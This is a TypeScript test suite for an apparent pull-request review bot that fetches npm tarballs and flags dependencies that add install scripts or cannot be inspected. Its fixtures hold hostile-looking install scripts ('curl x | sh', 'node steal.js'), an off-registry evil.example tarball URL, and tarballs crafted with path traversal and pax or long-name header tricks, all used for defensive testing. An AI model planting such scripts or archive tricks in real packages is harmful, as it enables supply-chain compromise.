// The Dependency check's tarball fetches, through the harness: install-script Findings and packages not inspected.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { gunzipSync, gzipSync } from 'node:zlib';
import type { AppConfig } from '../src/app.ts';
import {
  delivery, FakeGitHub, FakeRegistry, gitFixture, noFindings, openedPayload, packageTarball, prPayload, ScriptedModel, tarball, testApp,
} from './harness.ts';

const REPO = 'acme/widgets';
const LOCK = 'package-lock.json';
const url = (name: string, version: string) => `https://registry.npmjs.org/${name}/-/${name.split('/').pop()}-${version}.tgz`;

const lock = (packages: Record<string, object>) => JSON.stringify(
  { name: 'app', version: '1.0.0', lockfileVersion: 3, requires: true, packages: { '': { name: 'app' }, ...packages } }, null, 2) + '\n';
const pkg = (name: string, version: string, extra: object = {}) =>
  ({ version, resolved: url(name, version), integrity: `sha512-${name}${version}`, ...extra });
const deps = (versions: Record<string, string>) =>
  lock(Object.fromEntries(Object.entries(versions).map(([n, v]) => [`node_modules/${n}`, pkg(n, v)])));

/** The 1-based line of `"version"` under `key` in a lockfile. */
const versionLine = (text: string, key: string) => {
  const ls = text.split('\n');
  const from = ls.findIndex((l) => l.includes(`"${key}"`));
  return ls.findIndex((l, i) => i > from && l.includes('"version"')) + 1;
};

/** A PR changing the lockfile and a code file, so reviewers run and find nothing; approvals on. */
function setup(base: Record<string, object>, head: Record<string, object>, config: Partial<AppConfig> = {}) {
  const [baseLock, headLock] = [lock(base), lock(head)];
  const fx = gitFixture({ [LOCK]: baseLock, 'src/a.ts': 'a\n' }, { [LOCK]: headLock, 'src/a.ts': 'b\n' });
  const pr = { number: 9, state: 'open' as const, draft: false, headSha: fx.headSha, baseSha: fx.baseSha };
  const github = new FakeGitHub();
  github.addPullRequest(REPO, fx.url, pr);
  const registry = new FakeRegistry();
  const model = new ScriptedModel(Array.from({ length: 5 }, noFindings));
  const t = testApp({ model, github, registry, config: { approveWhenClean: true, ...config } });
  const opened = async () => {
    await t.app.receive(delivery('pull_request', openedPayload(REPO, pr)));
    await t.app.drain();
    return github.reviews.at(-1)!.review;
  };
  return { ...t, fx, pr, registry, headLock, opened };
}

test('an install script the new version adds is posted inline as high; one the old version already had is not', async () => {
  const s = setup(
    { 'node_modules/fresh': pkg('fresh', '1.0.0'), 'node_modules/steady': pkg('steady', '1.0.0') },
    { 'node_modules/fresh': pkg('fresh', '1.1.0'), 'node_modules/steady': pkg('steady', '1.1.0') },
  );
  s.registry.tarballs.set(url('fresh', '1.1.0'), packageTarball('fresh', '1.1.0', { postinstall: 'node steal.js', test: 'x' }));
  s.registry.tarballs.set(url('steady', '1.0.0'), packageTarball('steady', '1.0.0', { install: 'node-gyp rebuild' }));
  s.registry.tarballs.set(url('steady', '1.1.0'), packageTarball('steady', '1.1.0', { install: 'node-gyp rebuild' }));
  const review = await s.opened();

  assert.equal(review.comments.length, 1);
  const c = review.comments[0]!;
  assert.deepEqual([c.path, c.line], [LOCK, versionLine(s.headLock, 'node_modules/fresh')]);
  assert.match(c.body, /^\*\*fresh adds an install script\*\*\n\n`high` · security\n\n/);
  assert.match(c.body, /`postinstall`: `node steal\.js`/);
  assert.equal(review.event, 'COMMENT');
  assert.deepEqual(s.registry.fetched.sort(), [url('fresh', '1.0.0'), url('fresh', '1.1.0'), url('steady', '1.0.0'), url('steady', '1.1.0')]);
});

test("an install-script Thread isn't verified Fixed by a push whose tarball couldn't be fetched, and is once one without it is", async () => {
  const s = setup({ 'node_modules/fresh': pkg('fresh', '1.0.0') }, { 'node_modules/fresh': pkg('fresh', '1.1.0') });
  s.registry.tarballs.set(url('fresh', '1.1.0'), packageTarball('fresh', '1.1.0', { preinstall: 'curl x | sh' }));
  const c = (await s.opened()).comments[0]!;
  const thread = s.github.addThread(REPO, 9, c.path, c.line ?? null, c.body);
  const push = async (version: string) => {
    s.pr.headSha = s.fx.push({ [LOCK]: lock({ 'node_modules/fresh': pkg('fresh', version) }) });
    s.github.addPullRequest(REPO, s.fx.url, s.pr);
    await s.app.receive(delivery('pull_request', prPayload('synchronize', REPO, s.pr)));
    await s.app.drain();
    return s.github.reviews.at(-1)!.review;
  };

  s.registry.missing.add(url('fresh', '1.2.0'));
  await push('1.2.0');
  assert.equal(s.github.thread(thread.id).resolved, false);

  await push('1.3.0');
  assert.equal(s.github.thread(thread.id).resolved, true);
});

test('past the fetch cap, the riskiest packages are fetched and the rest are listed as not inspected, blocking approval', async () => {
  const s = setup(
    { 'node_modules/minor': pkg('minor', '1.0.0'), 'node_modules/major': pkg('major', '1.0.0') },
    { 'node_modules/minor': pkg('minor', '1.1.0'), 'node_modules/major': pkg('major', '2.0.0'), 'node_modules/added': pkg('added', '1.0.0') },
    { registryFetchPackages: 2 },
  );
  const review = await s.opened();

  assert.deepEqual(s.registry.fetched.sort(), [url('added', '1.0.0'), url('major', '1.0.0'), url('major', '2.0.0')]);
  assert.equal(review.event, 'COMMENT');
  assert.match(review.body, /\*\*Not approved:\*\* 1 package wasn't inspected \(listed below\)/);
  assert.match(review.body, /Not inspected \(its published code couldn't be fetched and read\):\n- `minor 1\.1\.0`\n/);
});

test('a package whose tarball 404s, is over the byte cap, or resolves off the registry is not inspected and blocks', async () => {
  const big = packageTarball('big', '1.1.0', {}, { 'blob.bin': Array.from({ length: 4000 }, (_, i) => i.toString(36)).join('') });
  const s = setup(
    { 'node_modules/gone': pkg('gone', '1.0.0'), 'node_modules/big': pkg('big', '1.0.0') },
    {
      'node_modules/gone': pkg('gone', '1.1.0'), 'node_modules/big': pkg('big', '1.1.0'),
      'node_modules/forked': pkg('forked', '1.0.0', { resolved: 'https://evil.example/forked-1.0.0.tgz' }),
    },
    { registryFetchBytes: big.length - 1 },
  );
  s.registry.missing.add(url('gone', '1.1.0'));
  s.registry.tarballs.set(url('big', '1.1.0'), big);
  const review = await s.opened();

  assert.ok(!s.registry.fetched.some((u) => u.includes('evil')));
  assert.match(review.body, /3 packages weren't inspected/);
  assert.match(review.body, /- `big 1\.1\.0`\n- `forked 1\.0\.0`\n- `gone 1\.1\.0`/);
  assert.equal(s.logs.find((l) => l.msg === 'dependencies checked')!.notInspected, 3);
  assert.deepEqual(s.logs.filter((l) => l.msg === 'package fetch failed').map((l) => l.url).sort(), [url('big', '1.1.0'), url('gone', '1.1.0')]);
});

test('a tarball entry escaping the package folder is ignored, even one that would land on package.json', async () => {
  const s = setup({ 'node_modules/sly': pkg('sly', '1.0.0') }, { 'node_modules/sly': pkg('sly', '1.0.1') });
  const other = JSON.stringify({ name: 'sly', scripts: { preinstall: 'node other.js' } });
  s.registry.tarballs.set(url('sly', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'sly', scripts: { postinstall: 'node real.js' } }),
    'package/../../package.json': other,
    'package/../package.json': other,
    // Normalized first, this would replace the root package.json and hide its script.
    'package/../x/package.json': JSON.stringify({ name: 'sly' }),
  }));
  const review = await s.opened();

  assert.equal(review.comments.length, 1);
  assert.match(review.comments[0]!.body, /`postinstall`: `node real\.js`/);
  assert.doesNotMatch(review.comments[0]!.body, /preinstall/);
});

test("the real registry adapter refuses any host but the npm registry's, before any network", async () => {
  const { npmRegistry } = await import('../src/registry.ts');
  await assert.rejects(npmRegistry().tarball('https://evil.example/registry.npmjs.org/a/-/a-1.0.0.tgz', 1000), /refused/);
  await assert.rejects(npmRegistry().tarball('https://registry.npmjs.org.evil.example/a/-/a-1.0.0.tgz', 1000), /refused/);
});

/** A pax extended header's records, each prefixed by its own length. */
const pax = (fields: Record<string, string>) => Object.entries(fields).map(([k, v]) => {
  const rest = ` ${k}=${v}\n`;
  let n = rest.length;
  while (`${n}${rest}`.length !== n) n = `${n}${rest}`.length;
  return `${n}${rest}`;
}).join('');

test('a package.json named by a pax header or a GNU long name is the one read, as npm extracts it', async () => {
  const s = setup({ 'node_modules/p': pkg('p', '1.0.0'), 'node_modules/g': pkg('g', '1.0.0') },
    { 'node_modules/p': pkg('p', '1.0.1'), 'node_modules/g': pkg('g', '1.0.1') });
  const evil = JSON.stringify({ name: 'x', scripts: { postinstall: 'node evil.js' } });
  s.registry.tarballs.set(url('p', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'p' }), 'PaxHeader/decoy': pax({ path: 'package/package.json' }), 'package/decoy': evil,
  }, { 'PaxHeader/decoy': 'x' }));
  s.registry.tarballs.set(url('g', '1.0.1'), tarball({
    'package/package.json': JSON.stringify({ name: 'g' }), '././@LongLink': 'package/package.json\0', 'package/decoy2': evil,
  }, { '././@LongLink': 'L', 'package/decoy2': '7' }));
  const review = await s.opened();

  assert.deepEqual(review.comments.map((c) => c.body.split('\n')[0]), ['**g adds an install script**', '**p adds an install script**']);
});

test('a tarball a reader could take another way than npm is not inspected, rather than read one way', async () => {
  const names = ['nl', 'chain', 'dot', 'glob', 'odd', 'key', 'utf'];
  const s = setup(Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.0')])),
    Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.1')])));
  const manifest = JSON.stringify({ name: 'x' });
  // A path record hidden inside another record's value: read by lengths it's a comment, split on newlines (node-tar) a path.
  const hidden = pax({ comment: `x\n29 path=package/package.json` });
  s.registry.tarballs.set(url('nl', '1.0.1'), tarball({ 'package/package.json': manifest, 'PaxHeader/a': hidden, 'package/a': manifest }, { 'PaxHeader/a': 'x' }));
  s.registry.tarballs.set(url('odd', '1.0.1'), tarball({ 'package/package.json': manifest, '././@LongLink': 'x\0', 'package/l': '' }, { '././@LongLink': 'K', 'package/l': '2' }));
  s.registry.tarballs.set(url('chain', '1.0.1'), tarball({
    'package/package.json': manifest, '././@LongLink': 'package/a\0', 'PaxHeader/b': pax({ path: 'package/b' }), 'package/c': manifest,
  }, { '././@LongLink': 'L', 'PaxHeader/b': 'x' }));
  s.registry.tarballs.set(url('dot', '1.0.1'), tarball({ 'package/package.json': manifest, './x/package.json': manifest }));
  s.registry.tarballs.set(url('glob', '1.0.1'), tarball({ 'pax_global_header': pax({ path: 'package/package.json' }), 'package/package.json': manifest }, { 'pax_global_header': 'g' }));
  // The same, hidden in a key.
  const inKey = pax({ [`x\n29 path=package/package.json\nc`]: 'v' });
  s.registry.tarballs.set(url('key', '1.0.1'), tarball({ 'package/package.json': manifest, 'PaxHeader/a': inKey, 'package/a': manifest }, { 'PaxHeader/a': 'x' }));
  // A path record node-tar would measure as longer than it says, once its invalid byte decodes to U+FFFD.
  const utf = gunzipSync(tarball({ 'package/package.json': manifest, 'PaxHeader/a': '29 path=package/package.json\n', 'package/a': manifest }, { 'PaxHeader/a': 'x' }));
  utf[utf.indexOf('json\n', 512) + 3] = 0xff;
  s.registry.tarballs.set(url('utf', '1.0.1'), gzipSync(utf));
  const review = await s.opened();

  assert.match(review.body, /7 packages weren't inspected/);
  assert.equal(s.logs.filter((l) => l.msg === 'package fetch failed' && l.error === 'malformed tar archive').length, 7);
});

test("a bundled package is read from its bundler's tarball, at the folder and version the lockfile records", async () => {
  const inner = (v: string, extra: object = {}) => ({ version: v, inBundle: true, ...extra });
  const s = setup(
    {
      'node_modules/host': pkg('host', '1.0.0'), 'node_modules/host/node_modules/a': inner('1.0.0'),
      'node_modules/host/node_modules/gone': inner('1.0.0'), 'node_modules/b': pkg('b', '1.0.0'),
    },
    {
      'node_modules/host': pkg('host', '1.1.0'), 'node_modules/host/node_modules/a': inner('1.0.1'),
      'node_modules/host/node_modules/gone': inner('1.0.1'), 'node_modules/b': pkg('b', '1.0.1', { inBundle: true }),
    },
  );
  const bundled = (v: string, scripts = {}) => JSON.stringify({ name: 'a', version: v, scripts });
  s.registry.tarballs.set(url('host', '1.0.0'), packageTarball('host', '1.0.0', {}, {
    'node_modules/a/package.json': bundled('1.0.0'), 'node_modules/gone/package.json': JSON.stringify({ version: '1.0.0' }),
  }));
  // `gone` isn't in there at the version the lockfile says.
  s.registry.tarballs.set(url('host', '1.1.0'), packageTarball('host', '1.1.0', {}, {
    'node_modules/a/package.json': bundled('1.0.1', { postinstall: 'node a.js' }), 'node_modules/gone/package.json': JSON.stringify({ version: '9.9.9' }),
  }));
  const review = await s.opened();

  assert.ok(s.registry.fetched.includes(url('b', '1.0.1')), 'an inBundle entry with a source of its own is fetched');
  assert.deepEqual(review.comments.map((c) => c.body.split('\n')[0]), ['**a adds an install script**']);
  assert.match(review.body, /1 package wasn't inspected/);
  assert.match(review.body, /Not inspected[^\n]*\n- `gone 1\.0\.1`\n\n/);
});

test("a bundled package moved under a bundler that didn't move isn't in that bundler's tarball, so it is not inspected", async () => {
  const inner = (v: string) => ({ version: v, inBundle: true });
  const s = setup({ 'node_modules/host': pkg('host', '1.0.0'), 'node_modules/host/node_modules/a': inner('1.0.0') },
    { 'node_modules/host': pkg('host', '1.0.0'), 'node_modules/host/node_modules/a': inner('1.0.1') });
  s.registry.tarballs.set(url('host', '1.0.0'), packageTarball('host', '1.0.0', {}, { 'node_modules/a/package.json': JSON.stringify({ version: '1.0.0' }) }));
  const review = await s.opened();

  assert.match(review.body, /Not inspected[^\n]*\n- `a 1\.0\.1`\n\n/);
});

test('a binding.gyp with no install script runs node-gyp on install, so it counts as one', async () => {
  const s = setup({ 'node_modules/native': pkg('native', '1.0.0') }, { 'node_modules/native': pkg('native', '1.1.0') });
  s.registry.tarballs.set(url('native', '1.1.0'), packageTarball('native', '1.1.0', {}, { 'binding.gyp': '{}' }));
  const review = await s.opened();

  assert.equal(review.comments.length, 1);
  assert.match(review.comments[0]!.body, /`install`: `node-gyp rebuild`/);
});

test('a package with no recorded source, not bundled, is not inspected', async () => {
  const s = setup({ 'node_modules/bare': { version: '1.0.0' } }, { 'node_modules/bare': { version: '1.0.1' } });
  const review = await s.opened();

  assert.match(review.body, /1 package wasn't inspected/);
  assert.match(review.body, /Not inspected[^\n]*\n- `bare 1\.0\.1`\n\n/);
});

test('fetches are logged one by one, and a Run superseded mid-fetch stops before the next', async () => {
  const names = ['a1', 'a2', 'a3'];
  const s = setup(Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.0')])),
    Object.fromEntries(names.map((n) => [`node_modules/${n}`, pkg(n, '1.0.1')])));
  const real = s.registry.tarball.bind(s.registry);
  let pushed = false;
  s.registry.tarball = async (u, max) => {
    if (!pushed) {
      pushed = true;
      s.pr.headSha = s.fx.push({ 'src/a.ts': 'c\n' });
      s.github.addPullRequest(REPO, s.fx.url, s.pr);
      await s.app.receive(delivery('pull_request', prPayload('synchronize', REPO, s.pr)));
    }
    return real(u, max);
  };
  await s.opened();

  const first = s.logs.filter((l) => l.msg === 'package fetched' && l.run === 1);
  assert.deepEqual(first.map((l) => l.url), [url('a1', '1.0.1')]);
  assert.deepEqual(s.github.reviews.map((r) => r.review.commit_id), [s.pr.headSha]);
});
